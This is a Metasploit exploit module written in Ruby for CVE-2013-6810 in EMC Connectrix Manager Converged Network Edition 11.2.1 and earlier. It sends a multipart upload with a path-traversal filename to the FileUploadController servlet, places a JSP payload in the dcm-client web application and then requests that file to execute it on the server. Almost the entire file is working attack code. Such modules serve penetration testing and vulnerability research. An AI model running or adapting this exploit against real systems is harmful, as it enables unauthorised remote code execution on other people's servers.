require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC CMCNE Inmservlets.war FileUploadController Remote Code Execution',
			'Description'    => %q{
				This module exploits a file upload vulnerability found in EMC 
				Connectrix Manager Converged Network Edition <= 11.2.1. The file
				upload vulnerability is triggered when sending a specially crafted
				filename to the FileUploadController servlet found within the 
				Inmservlets.war archive. This allows the attacker to upload a
				specially crafted file which leads to remote code execution in the
				context of the server user.
			},
			'Author'		 => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'ZDI', '13-280' ],
					[ 'CVE', '2013-6810' ]
				],
			'Privileged'	=> true,
			'Platform' 	=> 'win',
			'Arch'	=> ARCH_JAVA,
			'Targets'	=>
				[
					[ 'EMC CMCNE 11.2.1 / Windows Server 2003 SP2 ', {} ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 18 2013'))

		register_options([
			Opt::RPORT(80)
		], self.class)
	end

	def exploit

		peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
		deploy = "..\\..\\..\\deploy\\dcm-client.war\\"
		jsp = payload.encoded.gsub(/\x0d\x0a/, "").gsub(/\x0a/, "")
		@jsp_name = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"

		data = Rex::MIME::Message.new
		data.add_part("#{jsp}", nil, nil, "form-data; name=\"ftproot\"; filename=\"#{deploy}#{@jsp_name}\"")

		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")

		print_status("#{peer} - Uploading the JSP Payload...")
		res = send_request_cgi({
            'method'    => 'POST',
            'uri'       => normalize_uri("inmservlets", "FileUploadController"),
            'ctype'     => "multipart/form-data; boundary=#{data.bound}",
            'data'      => post_data,
			'headers'	=> {
				'ROOTDIR'	=> "ftproot"
			}
        })

		if res.code == 200 and res.body =~ /SUCCESSFULLY UPLOADED FILES!/
			print_good("File uploaded successfully!")
			print_status("Executing '#{@jsp_name}' now...")
			res = send_request_cgi({
				'method'	=> 'GET',
				'uri'		=> normalize_uri("dcm-client", "#{@jsp_name}")
			})
		else
			print_error("Does not look like the files were uploaded to #{peer}...")
		end

	end

end